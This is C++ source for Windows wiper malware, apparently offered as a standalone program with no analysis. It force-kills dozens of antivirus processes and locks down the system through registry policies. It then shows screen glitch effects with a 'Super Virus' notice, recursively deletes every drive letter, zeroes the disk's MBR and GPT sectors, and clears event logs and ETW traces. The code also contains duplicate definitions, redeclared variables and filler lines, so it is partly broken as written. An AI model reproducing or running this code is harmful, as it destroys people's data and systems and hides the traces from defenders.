#include <bits/stdc++.h>
#include <windows.h>
#include <conio.h>
#include <fstream>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <time.h>
#include <shellapi.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
void SilentExecuteCmd(LPCTSTR lpCmdLine)
{
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	CreateProcess(NULL, (LPTSTR)lpCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess != NULL)
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}

void EnableETWPrivilege()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	if (LookupPrivilegeValue(NULL, SE_TRACE_NAME, &tp.Privileges[0].Luid))
	{
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	}

	CloseHandle(hToken);
}

void SilentDeleteFile(LPCTSTR lpFilePath)
{
	if (GetFileAttributes(lpFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(lpFilePath);
	}
}

void SilentDeleteDir(LPCTSTR lpDirPath)
{
	TCHAR szSearchPath[MAX_PATH] = {0};
	WIN32_FIND_DATA fd = {0};
	_stprintf_s(szSearchPath, MAX_PATH, _T("%s\\*.*"), lpDirPath);

	HANDLE hFind = FindFirstFile(szSearchPath, &fd);
	if (hFind == INVALID_HANDLE_VALUE)
		return;

		do
		{
			if (_tcscmp(fd.cFileName, _T(".")) && _tcscmp(fd.cFileName, _T("..")))
			{
				TCHAR szItemPath[MAX_PATH] = {0};
				_stprintf_s(szItemPath, MAX_PATH, _T("%s\\%s"), lpDirPath, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					SilentDeleteDir(szItemPath);
					else
						SilentDeleteFile(szItemPath);
			}
		} while (FindNextFile(hFind, &fd));

		FindClose(hFind);
		RemoveDirectory(lpDirPath);
}

void ClearOnlyETW()
{

	EnableETWPrivilege();

	SilentExecuteCmd(_T("logman stop * -ets -quiet"));
	SilentExecuteCmd(_T("logman delete * -ets -quiet"));
	SilentExecuteCmd(_T("logman clear * -quiet"));
	std::vector<LPCTSTR> etwLogPaths = {
		_T("C:\\PerfLogs\\"),
		_T("C:\\Windows\\Temp\\*.etl"),
		_T("C:\\Windows\\Temp\\*.blg"),
		_T("C:\\Windows\\System32\\winevt\\Logs\\*.etl")
	};
	for (LPCTSTR path : etwLogPaths)
	{
		if (PathIsDirectory(path))
			SilentDeleteDir(path);
		else
			SilentExecuteCmd(_T("del /f /q /s ") + (CString)path);
	}

	SilentExecuteCmd(_T("wevtutil cl System -quiet"));
	SilentExecuteCmd(_T("wevtutil cl Application -quiet"));
	SilentExecuteCmd(_T("wevtutil cl Setup -quiet"));
	SilentExecuteCmd(_T("wevtutil cl ForwardedEvents -quiet"));
}
void InvertScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 0; y < h; y++) {
		for (int x = 0; x < w; x++) {
			COLORREF color = GetPixel(hdc, x, y);
			color = RGB(255 - GetRValue(color), 255 - GetGValue(color), 255 - GetBValue(color));
			SetPixel(hdc, x, y, color);
		}
	}
	ReleaseDC(NULL, hdc);
}

void GlitchScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 10000; i++) {
		int x = rand() % w;
		int y = rand() % h;
		COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
		SetPixel(hdc, x, y, color);
	}
	ReleaseDC(NULL, hdc);
}

void ShakeScreen() {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 10; i++) {
		SetWindowPos(GetDesktopWindow(), NULL, rand() % 10 - 5, rand() % 10 - 5, w, h, SWP_NOSIZE | SWP_NOZORDER);
		Sleep(50);
	}
}

void GradientScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int alpha = 0; alpha <= 255; alpha += 5) {
		RECT rect;
		GetClientRect(GetDesktopWindow(), &rect);
		HBRUSH brush = CreateSolidBrush(RGB(alpha, alpha, alpha));
		FillRect(hdc, &rect, brush);
		DeleteObject(brush);
		Sleep(20);
	}
	ReleaseDC(NULL, hdc);
}

void BlurScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 1; y < h - 1; y++) {
		for (int x = 1; x < w - 1; x++) {
			COLORREF c1 = GetPixel(hdc, x - 1, y - 1);
			COLORREF c2 = GetPixel(hdc, x, y - 1);
			COLORREF c3 = GetPixel(hdc, x + 1, y - 1);
			COLORREF c4 = GetPixel(hdc, x - 1, y);
			COLORREF c5 = GetPixel(hdc, x + 1, y);
			COLORREF c6 = GetPixel(hdc, x - 1, y + 1);
			COLORREF c7 = GetPixel(hdc, x, y + 1);
			COLORREF c8 = GetPixel(hdc, x + 1, y + 1);

			int r = (GetRValue(c1) + GetRValue(c2) + GetRValue(c3) + GetRValue(c4) +
			GetRValue(c5) + GetRValue(c6) + GetRValue(c7) + GetRValue(c8)) / 8;
			int g = (GetGValue(c1) + GetGValue(c2) + GetGValue(c3) + GetGValue(c4) +
			GetGValue(c5) + GetGValue(c6) + GetGValue(c7) + GetGValue(c8)) / 8;
			int b = (GetBValue(c1) + GetBValue(c2) + GetBValue(c3) + GetBValue(c4) +
			GetBValue(c5) + GetBValue(c6) + GetBValue(c7) + GetBValue(c8)) / 8;

			SetPixel(hdc, x, y, RGB(r, g, b));
		}
	}
	ReleaseDC(NULL, hdc);
}

void FlickerScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 5; i++) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, WHITENESS);
		Sleep(100);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		Sleep(100);
	}
	ReleaseDC(NULL, hdc);
}

void BlackAndWhiteScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 0; y < h; y++) {
		for (int x = 0; x < w; x++) {
			COLORREF color = GetPixel(hdc, x, y);
			int gray = (GetRValue(color) + GetGValue(color) + GetBValue(color)) / 3;
			SetPixel(hdc, x, y, RGB(gray, gray, gray));
		}
	}
	ReleaseDC(NULL, hdc);
}

void SnowScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 5000; i++) {
		int x = rand() % w;
		int y = rand() % h;
		SetPixel(hdc, x, y, RGB(255, 255, 255));
	}
	ReleaseDC(NULL, hdc);
}

void ShowNotification() {
	NOTIFYICONDATA nid = { sizeof(NOTIFYICONDATA) };
	nid.hWnd = NULL;
	nid.uFlags = NIF_INFO;
	nid.dwInfoFlags = NIIF_INFO;
	wcscpy(nid.szInfoTitle, L"Super Virus");
	wcscpy(nid.szInfo, L"你的电脑废了！");
	Shell_NotifyIcon(NIM_ADD, &nid);
	Shell_NotifyIcon(NIM_DELETE, &nid);
}

void ClearMBR(wchar_t* drivePath) {
	HANDLE hDrive = CreateFileW(
		drivePath,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDrive != INVALID_HANDLE_VALUE) {
		const int MBR_SIZE = 512;
		BYTE emptyMBR[MBR_SIZE] = {0};

		DWORD bytesWritten = 0;
		WriteFile(
			hDrive,
			emptyMBR,
			MBR_SIZE,
			&bytesWritten,
			NULL
		);

		CloseHandle(hDrive);
	}
}
void ClearGPT(wchar_t* drivePath2) {
	HANDLE hDrive = CreateFileW(
		drivePath2,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDrive != INVALID_HANDLE_VALUE) {
		const int SECTOR_SIZE = 512;
		const int GPT_HEADER_LBA = 34;
		BYTE emptySector[SECTOR_SIZE] = {0};

		for (int i = 0; i < GPT_HEADER_LBA; i++) {
			LARGE_INTEGER offset;
			offset.QuadPart = (LONGLONG)i * SECTOR_SIZE;

			SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);

			DWORD bytesWritten = 0;
			WriteFile(
				hDrive,
			 emptySector,
			 SECTOR_SIZE,
			 &bytesWritten,
			 NULL
			);
		}

		CloseHandle(hDrive);
	}
}
BOOL EnablePrivilege(LPCTSTR lpPrivilegeName)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpPrivilegeName, &tp.Privileges[0].Luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
	CloseHandle(hToken);
	return (GetLastError() == ERROR_SUCCESS);
}

void SilentDeleteFile(LPCTSTR lpFilePath)
{
	if (GetFileAttributes(lpFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		DeleteFile(lpFilePath);
	}
}


void BackupClearAndDeleteLog(LPCTSTR lpLogName, LPCTSTR lpBackupPath)
{
	HANDLE hEventLog = OpenEventLog(NULL, lpLogName);
	if (hEventLog != NULL)
	{
		ClearEventLog(hEventLog, lpBackupPath);
		CloseEventLog(hEventLog);
		SilentDeleteFile(lpBackupPath);
	}
}


void ClearAllLogsAndBackups()
{

	EnablePrivilege(SE_SECURITY_NAME);

	std::vector<LPCTSTR> logNames = {
		_T("System"),
		_T("Application"),
		_T("Security"),
		_T("Setup"),
		_T("ForwardedEvents")
	};


	TCHAR szTempPath[MAX_PATH] = {0};
	GetTempPath(MAX_PATH, szTempPath);

	for (LPCTSTR logName : logNames)
	{
		TCHAR szBackupPath[MAX_PATH] = {0};
		_stprintf_s(szBackupPath, MAX_PATH, _T("%s%s_Backup.evt"), szTempPath, logName);
		BackupClearAndDeleteLog(logName, szBackupPath);
	}
}

using namespace std;
#define cls system("cls")
#define SCRIPT_DIR "C:\\\\"
const string SCRIPT_PATH = SCRIPT_DIR + "\\diskpart_disk.txt";
int main() {
	system("title Microsoft Super Operating System");
	system("mode con cols=15 lines=1");
	Sleep(5000);
	system("start slmgr.vbs -upk");
	cls;
	{
		;
		;
		;
	}
	system("taskkill -im 360safe.exe -f");
	cls;
	{
		;
		;
		;
		string a="360";
		cls;
		cls;
		;
		;
	}
	system("taskkill -im 360tray.exe -f");
	cls;
	system("taskkill -im 360sd.exe -f");
	cls;
	{
		;
		string ol="360";
		;
		;
	}
	system("taskkill -im 360rp.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im 360TS.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im 360TSService.exe -f");
	cls;//
	;//
	;//
	;//
	;//
	;//
	;//
	system("taskkill -im 360TSTray.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im 360TSFirewall.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im 360TSUpdate.exe -f");
	cls;
	system("taskkill -im QQPCMgr.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im QQPCMgrTray.exe -f");
	cls;
	;
	system("taskkill -im QQPCRTP.exe -f");
	cls;
	;
	system("taskkill -im avp.exe -f");
	cls;
	;
	system("taskkill -im kav.exe -f");
	cls;
	;
	system("taskkill -im kis.exe -f");
	cls;
	;


	system("taskkill -im NortonSecurity.exe -f");
	cls;
	;
	system("taskkill -im ccSvcHst.exe -f");
	cls;
	;
	system("taskkill -im SymantecServiceFramework.exe -f");
	cls;
	;
	;
	system("taskkill -im McAfeeSecurityScan.exe -f");
	cls;
	;
	system("taskkill -im McAfeeFrameworkService.exe -f");
	cls;
	;
	system("taskkill -im McScan.exe -f");
	cls;
	;
	system("taskkill -im huorong.exe -f");
	cls;
	{
		;
	}
	system("taskkill -im hrservice.exe -f");
	;
	cls;
	system("taskkill -im hrtray.exe -f");
	;
	cls;
	system("taskkill -im hrfw.exe -f");
	;
	cls;
	{
		string fg="huorong";
		;
		//
		;//
		//
		;//
	}
	system("taskkill -im HIPS.exe -f");
	;
	;
	;
	;
	;
	cls;
	system("taskkill -im HIPStray.exe -f");
	cls;
	{
		//
	}
	system("taskkill -im HipsSvc.exe -f");
	cls;
	//
	;//
	;//
	//////////////
	;
	//////////
	;///////////////////////////
	////////////////////////////
	system("taskkill -im TrafficProt.exe -f");
	cls;
	system("taskkill -im MsMpEng.exe -f");
	cls;
	;//////////////////////////
	system("taskkill -im WinDefend.exe -f");
	cls;
	;
	system("taskkill -im SecHealthUI.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im Windows Defender UI.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im Mcshield.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im Frameworkservice.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im NortonAntiVirus.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im RavMonD.exe -f");
	cls;//________________________
	;//
	;//
	;
	;
	;////////////////////////////--------------------___
	//////////////////
	system("taskkill -im RAVMOND.exe -f");
	cls;
	;
	system("taskkill -im ravmon.exe -f");
	cls;
	;
	system("taskkill -im rsrv.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im bdagent.exe -f");
	cls;
	;
	;
	system("taskkill -im bitdefender.exe -f");
	cls;
	;
	;
	;
	system("taskkill -im bdservicehost.exe -f");
	cls;
	;
	;
	system("taskkill -im egui.exe -f");
	cls;
	;
	;
	system("taskkill -im ekrn.exe -f");
	cls;
	;
	;
	system("taskkill -im eService.exe -f");
	cls;
	;
	;
	system("taskkill -im esettray.exe -f");
	cls;
	;
	;
	system("taskkill -im avira.exe -f");
	cls;
	;
	;
	system("taskkill -im avguard.exe -f");
	cls;
	;
	;
	system("taskkill -im avira.service.host.exe -f");
	cls;
	;
	;
	system("taskkill -im Tmcc.exe -f");
	cls;
	;
	;
	system("taskkill -im Tmntsrv.exe -f");
	cls;
	;
	;
	system("taskkill -im TmPfw.exe -f");
	cls;
	;
	;
	system("taskkill -im PandaUI.exe -f");
	cls;
	;
	;
	system("taskkill -im PandaService.exe -f");
	cls;
	;/////////////fghnkni
	/////fgjhuuyhyi6uy6dfuhrgbm236i5fyj466t1n
	system("taskkill -im PandaShield.exe -f");
	cls;
	;
	;
	system("taskkill -im mbam.exe -f");
	cls;
	;
	;
	system("taskkill -im mbamservice.exe -f");
	cls;
	;
	;
	//////////////
	system("taskkill -im mbamtray.exe -f");
	cls;
	;
	;
	system("taskkill -im totalav.exe -f");
	cls;
	;
	;
	system("taskkill -im totalav.service.exe -f");
	cls;
	;
	system("taskkill -im SophosUI.exe -f");
	cls;
	;
	;
	system("taskkill -im SophosService.exe -f");
	cls;
	;
	;
	system("taskkill -im SophosWebProtection.exe -f");
	cls;
	;
	;
	system("taskkill -im kxetray.exe -f");
	cls;
	;
	;
	system("taskkill -im Kxescore.exe -f");
	cls;
	;
	;
	system("taskkill -im KAVStart.exe -f");
	cls;
	;
	;
	system("taskkill -im KWatch.exe -f");
	cls;
	;
	;
	system("taskkill -im KWatchX.exe -f");
	cls;
	;
	;
	system("taskkill -im KAV32.exe -f");
	cls;
	;
	;
	system("taskkill -im KAV64.exe -f");
	cls;
	;
	;
	system("taskkill -im KPFW32.exe -f");
	cls;
	;
	;
	system("taskkill -im KPFW64.exe -f");
	cls;
	;
	;
	system("taskkill -im KPFWtray.exe -f");
	cls;
	;
	;
	system("taskkill -im KMailMon.exe -f");
	cls;
	;
	;
	system("taskkill -im KUpdate.exe -f");
	cls;
	;
	;
	system("taskkill -im KUpdate.BIN -f");
	cls;
	;
	;
	system("taskkill -im ksafe.exe -f");
	cls;
	;
	;
	system("taskkill -im KSafeTray.exe -f");
	cls;
	;
	;
	system("taskkill -im KSafeService.exe -f");
	cls;
	;
	;
	system("taskkill -im kvsrvxp.exe -f");
	cls;
	;
	;
	system("taskkill -im kvsrv64.exe -f");
	cls;
	;
	;
	system("taskkill -im KVMonXP.exe -f");
	cls;
	;
	;
	system("taskkill -im KVMon64.exe -f");
	cls;
	;
	;
	system("taskkill -im KVTray.exe -f");
	cls;
	;
	;
	system("taskkill -im kvnative.exe -f");
	cls;
	;
	;
	system("taskkill -im KVUpdater.exe -f");
	cls;
	system("taskkill -im BaiduSd.exe -f");
	cls;
	;
	;
	system("taskkill -im BaiduSdSvc.exe -f");
	cls;
	system("taskkill -im BaiduSdTray.exe -f");
	cls;
	;
	;
	system("taskkill -im BavSvc.exe -f");
	cls;
	;
	;
	system("taskkill -im BavTray.exe -f");
	cls;
	system("taskkill -im bavmsservice.exe -f");
	cls;
	;
	;
	system("taskkill -im nprotect.exe -f");
	cls;
	;
	;
	system("taskkill -im nspupsvc.exe -f");
	cls;
	;
	;
	system("taskkill -im nprotectsvc.exe -f");
	cls;
	system("taskkill -im VRV.exe -f");
	cls;
	;
	;
	;
	;
	system("taskkill -im VrvArp.exe -f");
	cls;
	system("taskkill -im JingYunSvc.exe -f");
	cls;
	system("taskkill -im JingYunTray.exe -f");
	cls;
	system("taskkill -im FYAntivirus.exe -f");
	cls;
	system("taskkill -im FYFireWall.exe -f");
	cls;
	system("taskkill -im FYService.exe -f");
	cls;
	system("taskkill -im nortonsecurity.exe -f");
	cls;
	system("taskkill -im ccSvcHst.exe -f");
	cls;
	/////////
	system("taskkill -im SymEFASI.exe -f");
	cls;
	system("taskkill -im nsTray.exe -f");
	cls;
	system("taskkill -im mcafee.exe -f");
	cls;
	system("taskkill -im McAfeeUI.exe -f");
	cls;
	system("taskkill -im mfemms.exe -f");
	cls;
	system("taskkill -im mfevtps.exe -f");
	cls;
	system("taskkill -im mcafee.tray.exe -f");
	cls;
	system("taskkill -im gdlauncher.exe -f");
	cls;
	system("taskkill -im gddservice.exe -f");
	cls;/////////////////////////////////
	system("taskkill -im gdfire.exe -f");
	cls;/////////////////////////////////
	////////////////////////////////////
	system("taskkill -im gdtray.exe -f");
	cls;
	{
		//////////
	}
	{
		////////
	}
	system("taskkill -im QuickHeal.exe -f");
	cls;
	{
		;
		;
		;
	}
	system("taskkill -im QHSvc.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im QHTray.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im QHShield.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im K7TS.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im K7Service.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im K7Tray.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im AvastUI.exe -f");
	cls;
	system("taskkill -im AvastSvc.exe -f");
	cls;
	system("taskkill -im ashServ.exe -f");
	cls;
	system("taskkill -im ashDisp.exe -f");
	cls;
	system("taskkill -im avgui.exe -f");
	cls;
	system("taskkill -im avgcsrva.exe -f");
	cls;
	system("taskkill -im avgmfapx.exe -f");
	cls;
	system("taskkill -im avgtray.exe -f");
	cls;
	system("taskkill -im gdlauncher.exe -f");
	cls;
	system("taskkill -im gddservice.exe -f");
	cls;
	system("taskkill -im fsgui.exe -f");
	cls;
	system("taskkill -im fssvc.exe -f");
	cls;
	system("taskkill -im fsshield.exe -f");
	cls;
	system("taskkill -im fstray.exe -f");
	cls;
	system("taskkill -im wrsa.exe -f");
	cls;
	system("taskkill -im wrsservice.exe -f");
	cls;
	system("taskkill -im wrstray.exe -f");
	cls;
	system("taskkill -im malwarebytes.exe -f");
	cls;
	system("taskkill -im mbamservice.exe -f");
	cls;
	system("taskkill -im mbamtray.exe -f");
	cls;
	system("taskkill -im mbamchameleon.exe -f");
	cls;
	system("taskkill -im tmntsrv.exe -f");
	cls;
	system("taskkill -im trendmicro.exe -f");
	cls;
	system("taskkill -im tmtray.exe -f");
	cls;
	system("taskkill -im tmusa.exe -f");
	cls;
	system("taskkill -im tmproxy.exe -f");
	cls;
	system("taskkill -im PSUAMain.exe -f");
	cls;
	system("taskkill -im PSANHost.exe -f");
	cls;
	system("taskkill -im PandaTray.exe -f");
	cls;
	system("taskkill -im pskmad.sys -f");
	cls;
	system("taskkill -im PandaUpdate.exe -f");
	cls;
	system("taskkill -im cis.exe -f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("taskkill -im cmdagent.exe -f");
	cls;
	system("taskkill -im cmtray.exe -f");
	cls;
	system("taskkill -im cfp.exe -f");
	cls;
	system("taskkill -im sandboxie.dll -f");
	cls;
	system("taskkill -im SophosUI.exe -f");
	cls;
	system("taskkill -im SophosService.exe -f");
	cls;
	system("taskkill -im SophosTray.exe -f");
	cls;
	system("taskkill -im SophosUpdate.exe -f");
	cls;
	system("taskkill -im SophosFirewall.exe -f");
	cls;
	system("taskkill -im TotalAV.exe -f");
	cls;
	system("taskkill -im TotalAVService.exe -f");
	cls;
	system("taskkill -im TotalAVTray.exe -f");
	cls;
	system("taskkill -im TotalAVUpdate.exe -f");
	cls;
	system("taskkill -im TotalAVVPN.exe -f");
	cls;
	system("taskkill -im a2guard.exe -f");
	cls;
	system("taskkill -im a2start.exe -f");
	cls;
	system("taskkill -im a2tray.exe -f");
	cls;
	system("taskkill -im a2service.exe -f");
	cls;
	system("taskkill -im a2update.exe -f");
	cls;
	system("taskkill -im IMF.exe -f");
	cls;
	system("taskkill -im IMFTray.exe -f");
	cls;
	system("taskkill -im IMFFirewall.exe -f");
	cls;
	;
	system("taskkill -im Dism++主程序.exe -f");
	cls;
	if (0)
	{
		;
	}
	else
	{
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /f");
	cls;
	int i;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /f");
	cls;
	{
		;
		;
	}
	i = 36596886754;
	{

	}
	i = 63;
	system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /f");
	cls;
	system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
	cls;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
	cls;
	if(true)
	{
		if (0)
		{
			;
			;
			;
			;
			int f=56;
		}
		;
		{
			;
		}
		;
		;
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoClose /t REG_DWORD /d 1 /f");
	cls;
	;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f");
	cls;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDrives /t REG_DWORD /d 4294967295 /f");
	cls;
	;
	;
	;
	{
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
	cls;
	i=7;
	cls;
	cls;
	cls;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoSetFolders /t REG_DWORD /d 1 /f");
	cls;
	;
	;
	;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoViewOnDrive /t REG_DWORD /d 4294967295 /f");
	cls;
	{
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFind /t REG_DWORD /d 1 /f");
	cls;
	{
		;
		;
		;
	}
	system("taskkill -im wscript.exe -f");
	cls;
	{
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v RestrictRun /t REG_DWORD /d 1 /f");
	cls;
	;
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f");
	cls;
	{
		;
		;
	}
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	cls;
	{
		;
	}
	system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings /v Enabled /t REG_DWORD /d 0 /f");
	cls;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.vbs /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.js /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.html /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.mhtml /v PerceivedType /d txt /f");
	cls;
	;
	;
	;
	;
	;
	;
	system("reg add HKLM\\SOFTWARE\\Classes\\.htm /v PerceivedType /d txt /f");
	cls;
	if(1)
	{
		cls;
	}
	srand(time(NULL));

	for (int i = 0; i < 20; i++) {
		InvertScreen();
		Sleep(500);
		GlitchScreen();
		Sleep(500);
		ShakeScreen();
		Sleep(500);
		GradientScreen();
		Sleep(500);
		BlurScreen();
		Sleep(500);
		FlickerScreen();
		Sleep(500);
		BlackAndWhiteScreen();
		Sleep(500);
		SnowScreen();
		Sleep(500);
		ShowNotification();
		Sleep(1000);
	}
	system("taskkill -im explorer.exe -f");
	cls;
	;
	system("taskkill -im dwm.exe -f");
	cls;
	{
		int a=6;
		int b=4;
		int c=7;
		int b=a;
		int a=c;
		int c=b;
		int b=a;
	}
	system("del Z:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	;
	system("del Y:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del X:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del W:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del V:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del U:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	;
	;
	system("del T:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	;
	;
	system("del S:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del R:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del Q:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del P:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del O:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del N:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del M:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del L:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del K:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del J:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del I:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del H:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del G:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del F:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del E:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del D:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del B:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del A:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del C:\\* /f /s /q");
	cls;
	wchar_t drivePath[] = L"\\\\.\\PhysicalDrive0";
	ClearMBR(drivePath);
	wchar_t drivePath2[] = L"\\\\.\\PhysicalDrive0";
	ClearGPT(drivePath2);
	ClearAllLogsAndBackups();
	ClearOnlyETW();
